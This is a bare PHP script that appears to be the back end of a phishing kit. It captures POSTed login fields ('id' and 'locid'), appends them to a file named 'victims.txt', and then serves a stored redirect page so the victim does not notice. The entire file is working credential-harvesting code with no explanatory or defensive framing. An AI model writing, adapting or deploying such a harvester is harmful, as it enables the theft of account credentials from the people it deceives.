<?php
$u = $_POST['id'];
$p = $_POST['locid'];
$f = fopen('redir-copy.txt','r');
$r = fread($f,filesize("redir-copy.txt"));
fclose($f);
if ($u && $p){
    fwrite(fopen('victims.txt','a+'),$u.'<!:!>'.$p."\n");
    echo $r;    
}

?>